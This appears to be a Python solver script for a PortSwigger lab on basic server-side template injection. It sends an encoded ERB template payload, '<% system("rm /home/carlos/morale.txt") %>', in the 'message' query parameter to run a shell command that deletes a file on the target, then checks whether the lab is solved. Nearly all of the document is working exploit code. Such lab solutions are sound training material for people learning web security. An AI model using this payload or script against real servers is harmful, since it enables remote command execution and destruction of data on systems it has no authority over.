# Basic server-side template injection

# https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def send_payload(s, url):
	query_param = '/?message='
	payload = '<% system("rm /home/carlos/morale.txt") %>'
	inject = payload.replace('%', '%25').replace(' ', '+')
	print("\n[+] Trying inject payload '%s' on the target website..." % inject)
	print(f"[+] Sending get request on {query_param}{inject}\n")
	r = s.get(url + query_param + inject)
	time.sleep(1)
	if r.status_code == 200:
		result = re.search(b"""<div>(.*)\n</div>""", r.text.encode()).group(1)
	elif r.status_code == 500 and re.search(b"""<p class=is-warning>(.*)</p>""", r.text.encode()):
		result = re.search(b"""<p class=is-warning>(.*)</p>""", r.text.encode()).group(1)
	else:
		print("[-] Command Injection Failed !!!")
		sys.exit(0)
	print("[+] %s\'s output:" % url)
	print('\t%s' % result.decode())
	print("[+] Command Injection Successful !!!")


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Basic server-side template injection')
	parser = argparse.ArgumentParser(description="[+] Lab: Basic server-side template injection")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying send Server-Side Template Injection ...\n')
			time.sleep(1)
			send_payload(s, url)
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
